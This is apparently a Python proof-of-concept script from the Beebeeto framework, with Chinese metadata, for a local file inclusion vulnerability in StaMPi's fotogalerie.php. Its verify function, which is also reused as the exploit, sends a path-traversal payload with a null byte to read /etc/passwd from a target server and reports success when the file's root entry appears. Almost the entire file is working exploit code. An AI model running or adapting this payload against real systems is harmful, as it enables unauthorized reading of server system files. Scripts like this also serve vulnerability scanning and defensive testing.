#!/usr/bin/env python
# coding=utf-8


"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0035',
            'name': 'StaMPi /path/fotogalerie.php 本地文件包含漏洞 POC',
            'author': 'Tiny',
            'create_date': '2015-02-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'StaMPi',
            'vul_version': ['*'],
            'type': 'Local File Inclusion',
            'tag': ['StaMPi漏洞', '本地文件包含', '/path/fotogalerie.php', 'php'],
            'desc': '漏洞文件：/path/fotogalerie.php',
            'references': ['http://www.exploit-db.com/exploits/36031/',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = '/fotogalerie.php?id=../../../../../../../../../../etc/passwd%00'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root:x:0:0:root:/root:/bin/bash' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args

    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())